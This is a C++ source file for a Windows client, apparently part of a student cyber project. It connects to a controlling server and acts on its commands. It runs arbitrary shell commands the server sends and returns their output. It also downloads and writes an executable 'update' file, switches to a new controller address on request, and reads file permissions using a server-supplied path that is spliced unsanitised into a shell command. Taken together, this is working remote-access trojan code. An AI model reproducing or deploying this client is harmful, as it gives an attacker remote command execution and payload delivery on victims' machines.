#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <string>
#include <fstream>
#include "SocketManager.h"
#include "WindowsSocket.h"
#include "string.h"
#include "Aclapi.h""
using namespace std;

#define DEFAULT_BUFLEN 1050
#define DEFAULT_PORT "5006"
#define DEFAULT_HOST "127.0.0.1"

std::ofstream openFile(char *file_path)
{
	std::ofstream f2(file_path, std::fstream::binary);
	return f2;
}

void create_file(SocketManager socketManager, SOCKET socket, char* recBuf, int iResult)
{
	char * filePath = "C:\\Users\\admin\\Desktop\\CyberProject\\Client\\client_update_file.exe";
	std::ofstream clientFile = openFile(filePath);
	int iResult2;
	char recvbuf[DEFAULT_BUFLEN * 4];

	do
	{
		//char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
		memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
		iResult = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
		iResult2 = socketManager.send_data(socket, "ok");
		if ((strcmp(recvbuf, "END_UPDATE") != 0))
		{
			clientFile.write(recvbuf, iResult);
			printf("Bytes received: %d\n", iResult);
		}

	} while (strcmp(recvbuf, "END_UPDATE") != 0);


	if (!strcmp(recvbuf, "END_UPDATE"))
	{
		clientFile.close();
		cout << "closed the file" << endl;
	}
}
std::string exec(const char* cmd)
{
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}
void executeCommand(SocketManager socketManager, SOCKET socket)
{
	char recvbuf[DEFAULT_BUFLEN * 4];
	int iResult, iResult2;
	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
	iResult = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
	iResult2 = socketManager.send_data(socket, "ok");//ok
	std::string w = exec(recvbuf);
	cout << w.c_str() << endl;
	socketManager.send_data(socket, w.c_str());
	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);//
	iResult = socketManager.receive(socket, recvbuf, 2);//ok
	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
	iResult = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
	iResult2 = socketManager.send_data(socket, "ok");
	if (!strcmp(recvbuf, "END_EXECUTE"))
	{
		cout << "end execute" << endl;
	}
}

void dirInfo(SocketManager socketManager, SOCKET socket)
{
	int result;
	char recvbuf[DEFAULT_BUFLEN * 4];
	//get directory
	
	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN *4); // TODO: what to do with result?

	string dir = string(recvbuf);
	string command = "cd \"" + dir + "\" && for /f %x in ('dir /b /a') do icacls %x && attrib %x";
	
	//executes the command
	std::string w = exec(command.c_str());

	//send result
	result = socketManager.send_data(socket, w.c_str());	
}

bool changeIp(SocketManager & socketManager, SOCKET & socket)
{
	int result;
	char recvbuf[DEFAULT_BUFLEN * 4];

	//get ip:port
	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
	char* ip = strtok(recvbuf, ":");
	char* port = strtok(NULL, ":");

	//try to connect to new server
	SocketManager newsocketManager;
	//WindowsSocket windowsSocket;
	SOCKET newSocket = INVALID_SOCKET;

	struct addrinfo *addrInfo = NULL, hints;
	char *sendbuf = "this is a test14";
	char recvbuf2[DEFAULT_BUFLEN];
	//int iResult, iResult2;
	int recvbuflen = DEFAULT_BUFLEN;

	//windowsSocket.startup();
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	result = getaddrinfo(ip, port, &hints, &addrInfo);
	if (result != 0) {
		throw new exception("getaddrinfo failed with error: %d\n", result);
	}

	newsocketManager.setAddrInfo(addrInfo);

	// Attempt to connect to an address until one succeeds
	int i = 0;
	int connectResult = SOCKET_ERROR;
	
	// Create a SOCKET for connecting to server
	newSocket = newsocketManager.create();
	bool connected = false;
	while (i < 3) // handle timeout!
	{

		// Connect to server.
		connectResult = newsocketManager.conn(newSocket);
		if (connectResult == SOCKET_ERROR) {
			newsocketManager.close(newSocket);
			newSocket = INVALID_SOCKET;
			i++;
			continue;
		}
		connected = true;
		break;
	}

	freeaddrinfo(addrInfo);
	if (connected)
	{
		result = socketManager.send_data(socket, "accept");
		socketManager.close(socket);
		socketManager = newsocketManager;
		socket = newSocket;
	}

	//delete[] recvbuf;
	return connected;
}


//int main()
//{
//	string dir = "c:\\";
//	string command = "cd \"" + dir + "\" && for /f %x in ('dir /b') do icacls %x";
//	char * c = "\" && for /f %x in ('dir /b') do icacls %x";
//	cout << c;
//
//	cout << command;
//}
int main(int argc, char **argv)
{
	SocketManager socketManager;
	WindowsSocket windowsSocket;
	SOCKET socket = INVALID_SOCKET;

	struct addrinfo *result = NULL, hints;
	char *sendbuf = "this is a test14";
	char recvbuf[DEFAULT_BUFLEN];
	int iResult, iResult2;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	try
	{
		windowsSocket.startup();
		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		// Resolve the server address and port
		iResult = getaddrinfo(DEFAULT_HOST, DEFAULT_PORT, &hints, &result);
		if (iResult != 0) {
			throw new exception("getaddrinfo failed with error: %d\n", iResult);
		}

		socketManager.setAddrInfo(result);

		// Attempt to connect to an address until one succeeds
		bool connectResult = false;
		while (true) // handle timeout!
		{
			// Create a SOCKET for connecting to server
			socket = socketManager.create();

			// Connect to server.
			connectResult = socketManager.conn(socket);
			if (connectResult == SOCKET_ERROR) {
				socketManager.close(socket);
				socket = INVALID_SOCKET;
				continue;
			}
			break;
		}

		freeaddrinfo(result);

		// Send an initial buffer
		iResult = socketManager.send_data(socket, sendbuf);

		printf("Bytes Sent: %ld\n", iResult);

		// Receive until the peer closes the connection
		do {
			try
			{
				char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
				iResult = socketManager.receive(socket, recvbuf, recvbuflen * 4);
				if (iResult > 0)
				{

					//string buf = string(recvbuf);
					//cout << buf.substr(0, iResult);

					if (!strcmp(recvbuf, "UPDATE"))
					{
						create_file(socketManager, socket, recvbuf, iResult);
					}
					else if (!strcmp(recvbuf, "EXECUTE"))
					{
						executeCommand(socketManager, socket);
					}
					else if (!strcmp(recvbuf, "CHANGE_IP"))//2, 5
					{
						bool connected = changeIp(socketManager, socket);
						if (connected)
						{
							iResult2 = socketManager.send_data(socket, "this is a test");

						}
						else
						{
							iResult2 = socketManager.send_data(socket, "reject");
						}
					}
					else if (!strcmp(recvbuf, "FILE_SYSTEM_INFO"))//2, 6
					{
						dirInfo(socketManager, socket);
					}
					else
					{
						printf("Bytes received: %d\n", iResult);
						//iResult2 = socketManager.send_data(socket, "ok");
						string buf = string(recvbuf);
						cout << buf.substr(0, iResult);
					}
				}
			}
			catch (exception ex)
			{
				cout << ex.what();
				continue;
			}

		} while (iResult > 0);

		// cleanup

		socketManager.close(socket);
		windowsSocket.cleanup();
		return 0;
	}
	catch (exception ex)
	{
		cout << ex.what();
		windowsSocket.cleanup();
		return 1;
	}
}


